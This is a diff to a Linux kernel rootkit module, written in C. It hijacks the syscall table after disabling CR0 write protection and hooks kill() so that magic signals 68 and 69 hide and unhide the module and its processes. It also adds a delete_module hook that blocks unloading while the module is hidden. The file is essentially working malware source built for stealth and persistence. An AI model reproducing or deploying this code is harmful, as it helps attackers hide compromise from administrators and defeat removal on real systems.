@@ -1,15 +1,16 @@
 #include "hooks.h"
-
+#include "module.h"
 kallsyms_lookup_name_t my_kallsyms_lookup_name=NULL;
 unsigned long __lkm_order;
 t_syscall my_pre_sys_kill=NULL;
+t_syscall my_pre_sys_delete_mod=NULL;
 struct kprobe kp={
   .symbol_name="kallsyms_lookup_name",
 };
 unsigned long *__sys_call_table;
 
 
-void write_cr0_my(int a){
+static void write_cr0_my(int a){
   //Let's close the cr0 write protection
   unsigned long cr0;
   preempt_disable();
@@ -61,13 +62,32 @@ asmlinkage int hook_tar_kill(const struct pt_regs *pt){
     recover_hide_pid(current->pid);
     return 0;
   }else if(pid==0&&sig==68){
-  //  hide_module();
+    hide_module();
+    return 0;
+  }else if(pid==0&&sig==69){
+    unhide();
+    return 0;
   }
   //Let's call the real kill syscall but Do you know whether another LKM hook it? I don't know either.
   return (*my_pre_sys_kill)(pt);
 }
+char t_module_name[MODULE_NAME_LEN];
+asmlinkage int hook_tar_delete_mod(const struct pt_regs *pt){
+  char *name_user=(char *)pt->di;
+//  unsigned int flags=(unsigned int)pt->si;
+  if(strncpy_from_user(t_module_name,name_user,MODULE_NAME_LEN-1)<0){
+    return -EFAULT;
+  }
+  t_module_name[MODULE_NAME_LEN-1]='\0';
+  if(strncmp(t_module_name,THIS_MODULE->name,MODULE_NAME_LEN-1)==0&&module_hide==1){
+    //Let's ignore it
+    printk(KERN_INFO "It is seemed that we'll be killed.");
+    return -EFAULT;
+  }
+  return (*my_pre_sys_delete_mod)(pt);
+}
 
-void my_hook_kill(void){
+void my_hook_syscall(void){
   register_kprobe(&kp);
   my_kallsyms_lookup_name=(kallsyms_lookup_name_t)kp.addr;
   unregister_kprobe(&kp);
@@ -77,16 +97,19 @@ void my_hook_kill(void){
     return ;
   }
   my_pre_sys_kill=(void *)(__sys_call_table[__NR_kill]);
+  my_pre_sys_delete_mod=(void *)(__sys_call_table[__NR_delete_module]);
   printk(KERN_INFO "Hook yes! %p",my_pre_sys_kill);
   write_cr0_my(0);
   __sys_call_table[__NR_kill]=(unsigned long)(hook_tar_kill);
+  __sys_call_table[__NR_delete_module]=(unsigned long)(hook_tar_delete_mod);
   write_cr0_my(1);
   return ;
 }
 
-void my_unregister_hook_kill(void){
+void my_unregister_hook_syscall(void){
   write_cr0_my(0);
   __sys_call_table[__NR_kill]=(unsigned long )my_pre_sys_kill;
+  __sys_call_table[__NR_delete_module]=(unsigned long )my_pre_sys_delete_mod;
   write_cr0_my(1);
   return ;
 }
